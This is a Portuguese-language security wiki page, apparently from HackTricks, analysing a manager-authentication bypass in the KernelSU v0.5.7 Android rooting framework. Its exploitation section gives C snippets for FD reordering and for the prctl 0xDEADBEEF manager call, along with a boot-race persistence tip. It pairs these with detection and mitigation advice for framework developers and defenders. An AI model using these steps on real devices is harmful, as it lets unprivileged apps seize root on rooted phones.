# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Frameworks de rooting como KernelSU, APatch, SKRoot e Magisk frequentemente modificam o kernel Linux/Android e expõem funcionalidades privilegiadas a um app "manager" em userspace não privilegiado por meio de um syscall hookeado. Se a etapa de autenticação do manager for falha, qualquer app local poderá alcançar esse canal e elevar privilégios em dispositivos que já possuem root.

Esta página abstrai as técnicas e armadilhas identificadas em pesquisas públicas (notavelmente a análise da Zimperium sobre o KernelSU v0.5.7) para ajudar equipes red e blue a compreender superfícies de ataque, primitives de exploração e mitigações robustas.<sup>[[1]](#references)</sup>

---
## Padrão de arquitetura: canal do manager com syscall hookeado

- O módulo/patch do kernel faz hook de um syscall (comumente prctl) para receber "comandos" do userspace.
- O protocolo normalmente é: magic_value, command_id, arg_ptr/len ...
- Um app manager em userspace realiza a autenticação primeiro (por exemplo, CMD_BECOME_MANAGER). Depois que o kernel marca o caller como um manager confiável, comandos privilegiados são aceitos:
- Conceder root ao caller (por exemplo, CMD_GRANT_ROOT)
- Gerenciar allowlists/deny-lists para su
- Ajustar a política SELinux (por exemplo, CMD_SET_SEPOLICY)
- Consultar versão/configuração
- Como qualquer app pode invocar syscalls, a correção da autenticação do manager é crítica.

Exemplo (design do KernelSU):
- Syscall hookeado: prctl
- Magic value para redirecionar ao handler do KernelSU: 0xDEADBEEF
- Os comandos incluem: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## Fluxo de autenticação do KernelSU v0.5.7 (conforme implementado)

Quando o userspace chama prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), o KernelSU verifica:

1) Verificação do prefixo do path
- O path fornecido deve começar com um prefixo esperado para o UID do caller, por exemplo, /data/data/<pkg> ou /data/user/<id>/<pkg>.
- Referência: lógica de prefixo de path em core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Verificação de ownership
- O path deve pertencer ao UID do caller.
- Referência: lógica de ownership em core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Verificação da assinatura do APK por meio da varredura da tabela de FDs
- Iterar pelos file descriptors (FDs) abertos do processo chamador.
- Selecionar o primeiro arquivo cujo path corresponda a /data/app/*/base.apk.
- Analisar a assinatura APK v2 e verificar contra o certificado oficial do manager.
- Referências: manager.c (iteração dos FDs), apk_sign.c (verificação APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Se todas as verificações forem aprovadas, o kernel armazena temporariamente em cache o UID do manager e aceita comandos privilegiados desse UID até que ocorra um reset.

---
## Classe de vulnerabilidade: confiar no “primeiro APK correspondente” da iteração dos FDs

Se a verificação da assinatura estiver vinculada ao "primeiro /data/app/*/base.apk correspondente" encontrado na tabela de FDs do processo, ela não estará realmente verificando o próprio package do caller. Um attacker pode posicionar antecipadamente um APK legitimamente assinado (o manager real) para que ele apareça antes do próprio base.apk na lista de FDs.

Essa confiança por indireção permite que um app não privilegiado se passe pelo manager sem possuir a signing key do manager.<sup>[[1]](#references)</sup>

Principais propriedades exploradas:<sup>[[1]](#references)</sup>
- A varredura dos FDs não vincula a identidade do package do caller; ela apenas faz pattern matching de strings de paths.
- open() retorna o FD disponível de menor número. Ao fechar primeiro os FDs de número menor, um attacker pode controlar a ordenação.
- O filtro verifica apenas se o path corresponde a /data/app/*/base.apk – não se ele corresponde ao package instalado do caller.

---
## Pré-condições do ataque

- O dispositivo já possui root por meio de um rooting framework vulnerável (por exemplo, KernelSU v0.5.7).
- O attacker pode executar código não privilegiado arbitrário localmente (processo de app Android).
- O manager real ainda não foi autenticado (por exemplo, logo após um reboot). Alguns frameworks armazenam o UID do manager em cache após o sucesso; é necessário vencer a race.<sup>[[1]](#references)</sup>

---
## Visão geral da exploração (KernelSU v0.5.7)

Etapas de alto nível:<sup>[[1]](#references)[[9]](#references)</sup>
1) Criar um path válido para o diretório de dados do próprio app, para satisfazer as verificações de prefixo e ownership.
2) Garantir que um base.apk genuíno do KernelSU Manager seja aberto em um FD de número menor que o próprio base.apk.
3) Invocar prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) para passar pelas verificações.
4) Emitir comandos privilegiados como CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY para persistir a elevação.

Notas práticas sobre a etapa 2 (ordenação dos FDs):<sup>[[1]](#references)</sup>
- Identificar o FD do próprio /data/app/*/base.apk do processo percorrendo os symlinks de /proc/self/fd.
- Fechar um FD de número baixo (por exemplo, stdin, fd 0) e abrir primeiro o APK do manager legítimo para que ele ocupe o fd 0 (ou qualquer índice menor que o FD do próprio base.apk).
- Incluir o APK do manager legítimo no app para que seu path satisfaça o filtro ingênuo do kernel. Por exemplo, colocá-lo em um subpath que corresponda a /data/app/*/base.apk.

Exemplos de snippets de código (Android/Linux, apenas ilustrativos):

Enumerar FDs abertos para localizar entradas base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Force um FD de número inferior a apontar para o APK legítimo do manager:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autenticação do Manager via hook de prctl:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Após o sucesso, comandos privilegiados (exemplos):
- CMD_GRANT_ROOT: promover o processo atual para root
- CMD_ALLOW_SU: adicionar seu package/UID à allowlist para su persistente
- CMD_SET_SEPOLICY: ajustar a política do SELinux conforme o suporte do framework

Dica de race/persistence:
- Registre um receiver de BOOT_COMPLETED no AndroidManifest (RECEIVE_BOOT_COMPLETED) para iniciar cedo após o reboot e tentar a autenticação antes do manager legítimo.<sup>[[1]](#references)</sup>

---
## Orientações de detecção e mitigação

Para desenvolvedores de frameworks:
- Vincule a autenticação ao package/UID do caller, não a FDs arbitrários:
- Resolva o package do caller a partir do UID e verifique-o em relação à assinatura do package instalado (via PackageManager), em vez de fazer scanning de FDs.
- Se for kernel-only, use a identidade estável do caller (task creds) e valide-a em uma fonte estável de verdade gerenciada pelo init/helper em userspace, não por FDs de processos.
- Evite verificações de prefixo de path como identidade; elas podem ser trivialmente satisfeitas pelo caller.
- Use challenge–response baseado em nonce pelo channel e limpe qualquer identidade de manager armazenada em cache no boot ou em eventos importantes.
- Considere IPC autenticado baseado em binder em vez de sobrecarregar syscalls genéricas, quando viável.

Para defenders/blue team:
- Detecte a presença de rooting frameworks e processos de manager; monitore chamadas prctl com magic constants suspeitas (por exemplo, 0xDEADBEEF) se você tiver telemetria do kernel.
- Em frotas gerenciadas, bloqueie ou gere alertas para boot receivers de packages não confiáveis que tentem rapidamente executar comandos privilegiados do manager após o boot.
- Certifique-se de que os dispositivos estejam atualizados com versões corrigidas do framework; invalide IDs de manager armazenados em cache após atualizações.

Limitações do ataque:
- Afeta apenas dispositivos que já estejam rooted com um framework vulnerável.
- Normalmente requer um reboot/janela de race antes que o manager legítimo se autentique (alguns frameworks armazenam em cache o UID do manager até serem resetados).

---
## Notas relacionadas entre frameworks

- A autenticação baseada em password (por exemplo, builds históricos do APatch/SKRoot) pode ser fraca se as passwords forem fáceis de adivinhar ou sofrerem brute force, ou se as validações tiverem bugs.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- A autenticação baseada em package/signature (por exemplo, KernelSU) é, em princípio, mais forte, mas deve ser vinculada ao caller real, não a artefactos indiretos como scans de FDs.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: CVE-2024-48336 (MagiskEoP) mostrou que até ecossistemas maduros podem ser suscetíveis a spoofing de identidade, levando à execução de código com root dentro do contexto do manager.<sup>[[1]](#references)[[8]](#references)</sup>

---
## Referências

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
